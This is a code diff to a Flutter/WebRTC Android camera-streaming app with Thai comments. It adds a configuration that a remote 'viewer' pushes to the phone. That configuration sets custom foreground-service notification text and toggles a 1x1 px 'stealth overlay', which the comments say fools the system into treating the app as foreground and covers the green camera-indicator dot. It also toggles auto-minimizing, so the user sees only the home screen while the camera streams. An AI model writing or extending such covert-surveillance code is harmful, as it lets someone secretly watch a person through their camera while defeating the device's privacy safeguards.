@@ -1,5 +1,6 @@
 import 'package:flutter/material.dart';
 import 'package:flutter_webrtc/flutter_webrtc.dart';
+import 'camera_config.dart';
 import 'device_id.dart';
 import 'fcm_service.dart';
 import 'foreground_service.dart';
@@ -57,7 +58,18 @@ class _StreamingScreenState extends State<StreamingScreen> {
     _signaling.onIceCandidate = _onRemoteIce;
     _signaling.onError = (msg) => setState(() => _status = 'ข้อผิดพลาด: $msg');
 
+    // viewer push config มา → save ลง SharedPreferences (apply รอบหน้าตอน start FGS)
+    _signaling.onConfigPushed = (json) async {
+      final cfg = CameraConfig.fromJson(json);
+      await CameraConfigStore.save(cfg);
+      debugPrint('[streaming] config pushed: ${cfg.notifTitle}');
+    };
+
     _signaling.connect();
+
+    // โหลด config ที่ viewer push มาล่าสุด (default ถ้ายังไม่เคย set)
+    // ใช้คุม FGS notif text + stealth overlay + auto-minimize
+    final config = await CameraConfigStore.load();
 
     // ดึง device_id + FCM token แล้ว register ทั้งคู่กับ server
     // (FCM token อาจ null ถ้า Firebase ไม่พร้อม — server จะ fallback ไม่ส่ง push)
@@ -69,13 +81,19 @@ class _StreamingScreenState extends State<StreamingScreen> {
       fcmToken: fcmToken,
     );
 
-    // เริ่ม foreground service ก่อน getUserMedia
+    // เริ่ม foreground service ก่อน getUserMedia (พร้อม custom notif text)
     // (Android 14+ บังคับ: ต้องมี FGS ก่อนถึงจะเข้าถึงกล้อง background ได้)
-    await ForegroundService.start();
+    await ForegroundService.start(
+      notifTitle: config.notifTitle,
+      notifBody: config.notifBody,
+    );
 
     // เริ่ม 1×1 px stealth overlay (เทคนิค AirDroid) — หลอกระบบว่า app foreground
     // ทำให้กล้องเข้าถึงได้แม้ user lock screen / สลับไป app อื่น
-    await ForegroundService.startStealthOverlay();
+    // → viewer ปิด toggle นี้ได้ถ้าไม่อยากให้มี overlay ทับจุดเขียว
+    if (config.stealthOverlay) {
+      await ForegroundService.startStealthOverlay();
+    }
 
     // เริ่มกล้อง
     _localStream = await navigator.mediaDevices.getUserMedia({
@@ -95,7 +113,8 @@ class _StreamingScreenState extends State<StreamingScreen> {
 
     // Silent mode: ส่ง activity ไป background ทันที — user เห็น home screen
     // กล้องยังสตรีมผ่าน FGS + StealthOverlay
-    if (widget.silent) {
+    // → ทำเฉพาะตอน silent (auto-launch) + viewer เปิด autoMinimize toggle
+    if (widget.silent && config.autoMinimize) {
       await Future.delayed(const Duration(milliseconds: 500));
       await ForegroundService.minimizeApp();
     }
